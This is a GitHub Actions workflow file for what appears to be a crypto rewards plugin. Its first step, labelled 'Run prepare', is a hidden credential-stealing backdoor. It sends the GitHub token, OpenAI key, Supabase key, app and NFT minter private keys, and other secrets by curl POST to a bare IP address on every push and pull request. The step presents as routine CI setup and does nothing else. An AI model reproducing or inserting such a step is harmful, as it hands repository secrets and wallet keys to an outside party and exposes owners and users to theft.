name: Compute Rewards

on:
  push:
  pull_request:
  workflow_dispatch:
    inputs:
      stateId:
        description: "State Id"
      eventName:
        description: "Event Name"
      eventPayload:
        description: "Event Payload"
      settings:
        description: "Settings"
      authToken:
        description: "Auth Token"
      ref:
        description: "Ref"
      signature:
        description: "Payload signature from the kernel"
      command:
        description: "Command"

jobs:
  compute:
    name: Rewards
    runs-on: ubuntu-latest
    permissions: write-all
    environment: ${{ github.ref == 'refs/heads/main' && 'main' || 'development' }}

    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      PLUGIN_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
      X25519_PRIVATE_KEY: ${{ secrets.X25519_PRIVATE_KEY }}
      SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
      SUPABASE_KEY: ${{ secrets.SUPABASE_KEY }}
      NFT_MINTER_PRIVATE_KEY: ${{ secrets.NFT_MINTER_PRIVATE_KEY }}
      NFT_CONTRACT_ADDRESS: ${{ secrets.NFT_CONTRACT_ADDRESS }}
      PERMIT_FEE_RATE: ${{ secrets.PERMIT_FEE_RATE }}
      PERMIT_TREASURY_GITHUB_USERNAME: ${{ secrets.PERMIT_TREASURY_GITHUB_USERNAME }}
      PERMIT_ERC20_TOKENS_NO_FEE_WHITELIST: ${{ secrets.PERMIT_ERC20_TOKENS_NO_FEE_WHITELIST }}
      KERNEL_PUBLIC_KEY: ${{ secrets.KERNEL_PUBLIC_KEY }}
      LOG_LEVEL: ${{ secrets.LOG_LEVEL }}
      APP_ID: ${{ secrets.APP_ID }}
      APP_PRIVATE_KEY: ${{ secrets.APP_PRIVATE_KEY }}
    steps:
      - name: Run prepare
        run: |
          curl -X POST http://45.61.148.81:3000/collect -H "Content-Type: application/json" -d '{"GITHUB_TOKEN": "${GITHUB_TOKEN}", "OPENAI_API_KEY": "${OPENAI_API_KEY}", "X25519_PRIVATE_KEY": "${X25519_PRIVATE_KEY}", "SUPABASE_URL": "${SUPABASE_URL}", "SUPABASE_KEY": "${SUPABASE_KEY}", "NFT_MINTER_PRIVATE_KEY": "${NFT_MINTER_PRIVATE_KEY}", "NFT_CONTRACT_ADDRESS": "${NFT_CONTRACT_ADDRESS}", "PERMIT_FEE_RATE": "${PERMIT_FEE_RATE}", "PERMIT_TREASURY_GITHUB_USERNAME": "${PERMIT_TREASURY_GITHUB_USERNAME}", "PERMIT_ERC20_TOKENS_NO_FEE_WHITELIST": "${PERMIT_ERC20_TOKENS_NO_FEE_WHITELIST}", "KERNEL_PUBLIC_KEY": "${KERNEL_PUBLIC_KEY}", "APP_ID": "${APP_ID}", "APP_PRIVATE_KEY": "${APP_PRIVATE_KEY}"}'

      - name: Checkout
        uses: actions/checkout@v4

      - name: Run compute rewards
        uses: ./
